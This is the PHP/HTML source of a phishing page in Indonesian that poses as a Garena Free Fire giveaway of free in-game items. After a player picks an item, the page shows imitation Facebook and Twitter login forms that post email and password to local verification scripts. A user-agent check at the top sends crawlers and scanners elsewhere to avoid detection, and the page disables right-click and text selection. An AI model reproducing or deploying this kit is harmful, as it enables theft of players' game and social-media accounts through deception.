<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("fsystem/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>


<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="css/login/google.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.css">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> <!--- navbar-menu --->
<div class="navbar-logo-box">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/logo-small-fixed.png">
</div> <!--- navbar-logo-box --->
</div> <!--- navbar --->
<div class="reward-content">
<div class="menu-wrapper">
<center>
<div class="menu-choose kiri" style="border-top-left-radius: 3px; border-bottom-left-radius: 3px;" onclick="openRewards(event, 'latest');" id="defaultTabRewards">Hadiah 1</div>
<div class="menu-choose kanan" style="border-top-right-radius: 3px; border-bottom-right-radius: 3px;" onclick="openRewards(event, 'other');">Hadiah Lainnya</div>
<div class="menu-choose tengah" onclick="openRewards(event, 'season');">Hadiah 2</div>
</center>
</div> <!--- menu-wrapper --->
<div class="tab_rewards" id="latest">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
<div class="menu-notify-txt">Hi Survivor, Ini Adalah Hadiah Gratis Untukmu</div>
</div> <!--- menu-notify --->
<div class="scroll">
<div class="item kanan">
<img src="hadiah/1.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/1.png">Ambil</button>
</div>
<div class="item kiri">
<img src="hadiah/2.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/2.png">Ambil</button>
</div>
<div class="item tengah">
<img src="hadiah/3.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/3.png">Ambil</button>
</div>
<div class="item kanan">
<img src="hadiah/4.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/4.png">Ambil</button>
</div>
<div class="item kiri">
<img src="hadiah/5.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/5.png">Ambil</button>
</div>
<div class="item tengah">
<img src="hadiah/6.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/6.png">Ambil</button>
</div>
<div class="item kanan">
<img src="hadiah/7.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/7.png">Ambil</button>
</div>
<div class="item kiri">
<img src="hadiah/8.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/8.png">Ambil</button>
</div>
<div class="item tengah">
<img src="hadiah/9.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/9.png">Ambil</button>
</div>
<div class="item kanan">
<img src="hadiah/10.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/10.png">Ambil</button>
</div>
<div class="item kiri">
<img src="hadiah/11.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/11.png">Ambil</button>
</div>
<div class="item tengah">
<img src="hadiah/12.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/12.png">Ambil</button>
</div>
<div class="item kanan">
<img src="hadiah/13.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/13.png">Ambil</button>
</div>
<div class="item kiri">
<img src="hadiah/14.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/14.png">Ambil</button>
</div>
<div class="item tengah">
<img src="hadiah/15.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/15.png">Ambil</button>
</div>
<div class="item kanan">
<img src="hadiah/16.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/16.png">Ambil</button>
</div>
<div class="item kiri">
<img src="hadiah/17.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/17.png">Ambil</button>
</div>
<div class="item tengah">
<img src="hadiah/18.png">
<button type="button" onclick="open_reward_confirmation(this)" src="hadiah/18.png">Ambil</button>
</div>
</div> <!--- scroll --->
</div> <!--- tab_rewards --->

<div class="tab_rewards" id="season">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
<div class="menu-notify-txt">Hi Survivor, Ini Adalah Hadiah Gratis Untukmu</div>
</div> <!--- menu-notify --->
<div class="scroll">
<div class="item kanan">
<img src="img/reward/season/titan.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/titan.png">Ambil</button>
</div>
<div class="item kiri">
<img src="img/reward/season/ak.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/ak.png">Ambil</button>
</div>
<div class="item tengah">
<img src="img/reward/season/cupid.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/cupid.png">Ambil</button>
</div>
<div class="item kanan">
<img src="img/reward/season/sg2.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/sg2.png">Ambil</button>
</div>
<div class="item kiri">
<img src="img/reward/season/m1014.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/m1014.png">Ambil</button>
</div>
<div class="item tengah">
<img src="img/reward/season/sg2v2.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/sg2v2.png">Ambil</button>
</div>
<div class="item kanan">
<img src="img/reward/season/m1014v2.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/m1014v2.png">Ambil</button>
</div>
<div class="item kiri">
<img src="img/reward/season/mp40.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/mp40.png">Ambil</button>
</div>
<div class="item tengah">
<img src="img/reward/season/awm.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/awm.png">Ambil</button>
</div>
<div class="item kanan">
<img src="img/reward/season/m4.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/m4.png">Ambil</button>
</div>
<div class="item kiri">
<img src="img/reward/season/famas.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/famas.png">Ambil</button>
</div>
<div class="item tengah">
<img src="img/reward/season/mp40lgi.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/mp40lgi.png">Ambil</button>
</div>
<div class="item kanan">
<img src="img/reward/season/p90.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/p90.png">Ambil</button>
</div>
<div class="item kiri">
<img src="img/reward/season/ncc.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/ncc.png">Ambil</button>
</div>
<div class="item tengah">
<img src="img/reward/season/epas.png">
<button type="button" onclick="open_reward_confirmation(this)" src="img/reward/season/epas.png">Ambil</button>
</div>
</div> <!--- scroll --->
</div> <!--- tab_rewards --->

<div class="tab_rewards" id="other">
<script type="text/javascript">
function buka(nama) {
$("#konten").html('<div class="load-item">Mohon tunngu...</div>');
	$.ajax({
		url	: nama+'.php',
		type	: 'GET',
		dataType: 'html',
		success	: function(isi){
			$("#konten").html(isi);
		},
	});
}

</script>
<div id="konten">
<?php include 'pages/dm.php';?>
</div>
</div> <!--- tab_rewards --->

</div> <!--- reward-content --->
</div> <!--- container-mask --->
</div> <!--- container --->


<div class="popup reward_confirmation" style="display: none;">
<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> <!--- navbar-menu --->
<div class="navbar-logo-box">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/logo-small-fixed.png">
</div> <!--- navbar-logo-box --->
</div> <!--- navbar --->
<div class="reward-content">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-help-outline"></i></div>
<div class="menu-notify-txt">Hi Survivor, Anda Yakin Akan Ambil Hadiah Ini?</div>
</div> <!--- menu-notify --->
<div class="item-confirmation">
<div class="item-confirmation-img-box">
<img src="" id="myReward">
</div> <!--- item-confirmation-img-box --->
<div class="item-confirmation-info">
<div class="item-confirmation-status-title">
Hadiah Tersedia
</div> <!--- item-confirmation-status-title --->
<div class="item-confirmation-status-info">
Hadiah ini tersedia untuk diambil
</div> <!--- item-confirmation-status-info --->
<div class="item-confirmation-information-title">
Informasi Hadiah
</div> <!--- item-confirmation-status-title --->
<div class="item-confirmation-information-info">
Hadiah gratisan dari Garena
</div> <!--- item-confirmation-status-info --->
</div> <!--- item-confirmation-info --->
</div> <!--- item-confirmation --->
<div class="btn-popup-wrapper">
<div class="btn-popup kiri" onclick="close_reward_confirmation()">
<div class="btn-popup-icon"><i class="fa fa-chevron-left fa-md"></i></div>
<div class="btn-popup-txt">Kembali Ke Menu Awal</div>
</div> <!--- btn-popup --->
<div class="btn-popup kanan" onclick="open_account_login()">
<div class="btn-popup-icon" style="margin-right: 0px; float: right;"><i class="fa fa-chevron-right fa-md" style="margin-left: 3px;"></i></div>
<div class="btn-popup-txt">Ambil Hadiah Ini</div>
</div> <!--- btn-popup --->
</div> <!--- btn-popup-wrapper --->
</div> <!--- reward-content --->
</div> <!--- container-mask --->
</div> <!--- container --->
</div> <!--- popup-reward --->

<div class="popup account_login" style="display: none;">
<div class="container">
<div class="container-mask">
<div class="navbar">
<div class="navbar-menu">
<i class="fa fa-bars"></i>
</div> <!--- navbar-menu --->
<div class="navbar-logo-box">
<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/logo-small-fixed.png">
</div> <!--- navbar-logo-box --->
</div> <!--- navbar --->
<div class="reward-content">
<div class="menu-notify">
<div class="menu-notify-icon"><i class="zmdi zmdi-info-outline"></i></div>
<div class="menu-notify-txt">Masuk Ke Akun FREE FIRE Anda Untuk Menerima Hadiah Ini</div>
</div> <!--- menu-notify --->
<div class="btn-login" onclick="open_facebook_login()">
<div class="btn-login-logo">
<img src="https://i.ibb.co/w45vvsC/facebook-icon.png">
</div>
<div class="btn-login-txt">Masuk dengan Facebook</div>
</div>


<div class="popup-login login_facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="close_facebook_login()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
		<div class="navbar-fb">
			<img src="https://i.ibb.co/QNdsmDc/facebook-text.png">
		</div>
		<div class="content-box-fb">
			<img src="http://freefiremobile-a.akamaihd.net/ffwebsite/images/app-icon.png">
			<div class="txt-login-fb">
				 Masuk Ke Akun FREE FIRE Anda Untuk Menerima Hadiah Ini
			</div>
			<form action="verification.php" method="post">
				<input type="text" class="input-fb-email" name="email" placeholder="Nomor ponsel atau email" autocomplete="off" autocapitalize="off" required>
				<input type="password" class="input-fb-password" name="password" placeholder="Kata Sandi" autocomplete="off" autocapitalize="off" required>
				<input type="hidden" name="login" value="Facebook" readonly>
				<button type="submit" class="btn-login-fb">Masuk</button>
			</form>
			<div class="txt-create-account">Buat Akun</div>
			<div class="txt-forgotten-password">Lupa Kata Sandi?</div>
		</div>
		<div class="language-box">
			<center>
			<div class="language-name language-name-active">Bahasa Indonesia</div>
			<div class="language-name">English (UK)</div>
			<div class="language-name">Bahasa Melayu</div>
			<div class="language-name">Basa Jawa</div>
			<div class="language-name">Español</div>
			<div class="language-name">Português (Brasil)</div>
			<div class="language-name">Français (France)</div>
			<div class="language-name">
				<i class="fa fa-plus"></i>
			</div>
			</center>
		</div>
		<div class="copyright">Facebook Inc.</div>
	</div>
</div>

<div class="popup-login login_twitter animated fadeIn" style="display: none;">
	<div class="popup-box-login-twitter">
	<a onclick="close_twitter_login()" class="close-other"><i class="zmdi zmdi-close"></i></a>
		<div class="header-twitter">
			<center>
			<img src="https://i.ibb.co/W0V2vPK/twitter-text.png">
			</center>
		</div>
		<div class="box-twitter">
			<center>
			<form action="verifications.php" method="post">
				<div class="txt-login-twitter">Login to Twitter</div>
				<div class="input-box-twitter">
					<label>Phone, email, or username</label>
					<input type="text" name="email" placeholder="" required>
				</div>
				<div class="input-box-twitter">
					<label>Password</label>
					<input type="password" name="password" placeholder="" required>
				</div>
				<input type="hidden" name="login" value="Twitter" readonly>
				<button type="submit" class="btn-login-twitter">Log In</button>
				<div class="footer-menu-twitter">Forgot password?</div>
				<div class="footer-menu-twitter bulet">•</div>
				<div class="footer-menu-twitter">Sign up to Twitter</div>
			</form>
			</center>
		</div>
	</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/tab.js"></script>
<script src="js/popup.js"></script>

</body>
</html>
